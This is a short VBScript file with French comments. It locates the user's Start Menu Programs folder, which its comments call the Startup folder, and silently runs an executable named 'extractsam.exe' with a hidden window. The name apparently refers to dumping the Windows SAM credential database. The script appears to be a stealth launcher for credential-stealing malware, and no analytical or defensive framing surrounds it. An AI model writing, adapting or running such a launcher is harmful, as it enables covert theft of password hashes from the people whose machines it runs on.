' Crée les objets nécessaires
Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Définir les deux chemins potentiels pour le dossier Startup
startup_en = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs")
startup_fr = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Menu Démarrer\Programmes")

' Choisir le bon chemin selon la langue du système
If fso.FolderExists(startup_en) Then
    startupPath = startup_en
ElseIf fso.FolderExists(startup_fr) Then
    startupPath = startup_fr
Else
    WScript.Quit  ' Aucun des deux chemins n'existe
End If

' Construire le chemin complet vers l'exécutable
exePath = startupPath & "\extractsam.exe"

' Vérifier si l'exécutable existe
If fso.FileExists(exePath) Then
    ' Exécuter silencieusement le fichier .exe
    objShell.Run """" & exePath & """", 0, False
End If
